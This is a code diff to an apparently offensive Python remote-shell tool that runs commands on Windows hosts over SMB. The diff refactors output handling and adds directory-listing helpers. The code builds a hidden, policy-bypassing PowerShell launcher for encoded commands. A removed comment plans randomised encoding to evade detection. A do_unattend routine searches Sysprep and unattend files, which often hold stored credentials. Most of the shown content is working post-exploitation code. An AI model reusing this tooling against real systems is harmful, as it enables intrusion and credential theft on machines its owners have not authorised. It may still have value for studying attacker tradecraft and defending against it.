@@ -61,14 +61,6 @@ class RemoteShell(cmd.Cmd):
         self.__outputBuffer = str('')
         self.__shell = temp_perm("cmd") + ' /Q /c '
         self.__shell_type = shell_type
-        # call function here that will generate random encoding schemes here, in addition to shuffling order of flags where we can
-        # -NOL --> No Logo
-        # -NOP --> No execution profile
-        # -STA --> Single Threaded Apartment
-        # -NONI --> Non interactive
-        # -W --> Window Style needs Hidden After
-        # -Exec --> Needs bypass after
-        # -Enc --> Encoded command
         self.__pwsh = temp_perm("power") + ' -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc '
         self.__win32Process = win32Process
         self.__transferClient = smbConnection
@@ -116,6 +108,11 @@ class RemoteShell(cmd.Cmd):
     def format_print_buff(self):
         if len(self.__outputBuffer.strip('\r\n')) > 0:
             print(self.__outputBuffer)
+            self.__outputBuffer = ''
+
+    def print_buf(self, buf: str):
+        if len(buf.strip('\r\n')) > 0:
+            print(buf)
             self.__outputBuffer = ''
 
     def do_shell(self, s):
@@ -217,6 +214,27 @@ class RemoteShell(cmd.Cmd):
         except Exception as e:
             print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
 
+    def get_directory_listing(self, path: str) -> str:
+        try:
+            self.execute_remote(f'dir {path}')
+            # dont think i need the below line anymore 
+            if len(self.__outputBuffer.strip('\r\n')) > 0:
+                return self.__outputBuffer
+        except Exception as e:
+            print("[!] Something went wrong, see below for error:\n", e)
+            return e
+        
+
+    def get_directory_listing_findstr(self, path: str, findstr_args: str) -> str:
+        try:
+            self.execute_remote(f'dir {path} | findstr /i {findstr_args}')
+            # dont think i need the below line anymore 
+            if len(self.__outputBuffer.strip('\r\n')) > 0:
+                return self.__outputBuffer
+        except Exception as e:
+            print("[!] Something went wrong, see below for error:\n", e)
+            return e
+
     # an array, ever heard of one...
     def do_unattend(self, s):
         one = r"C:\unattend.txt"
@@ -231,15 +249,16 @@ class RemoteShell(cmd.Cmd):
         ten = r"C:\Windows\System32\Sysprep\unattend.xml"
         eleven = r"C:\Windows\System32\Sysprep\unattended.xml"
 
-        try:
-            logging.info("Looking for: %s, %s" % (one, two))
-            self.execute_remote('dir C:\ | findstr /i "unattend.txt || unattend.inf"')
-            if len(self.__outputBuffer.strip('\r\n')) > 0:
-                self.format_print_buff()
-            else:
-                print("Nothing Found")
-        except Exception as e:
-            print("[!] Something went wrong, see below for error:\n", e)
+        logging.info("Looking for: %s, %s" % (one, two))
+        buf = self.get_directory_listing_findstr('C:\\', 'unattend.txt || unattend.inf')
+        self.print_buf(buf)
+            #self.execute_remote('dir C:\ | findstr /i "unattend.txt || unattend.inf"')
+            #if len(self.__outputBuffer.strip('\r\n')) > 0:
+            #    self.format_print_buff()
+            #else:
+            #    print("Nothing Found")
+        #except Exception as e:
+        #    print("[!] Something went wrong, see below for error:\n", e)
 
         try:
             logging.info("Looking for: %s" % (three))
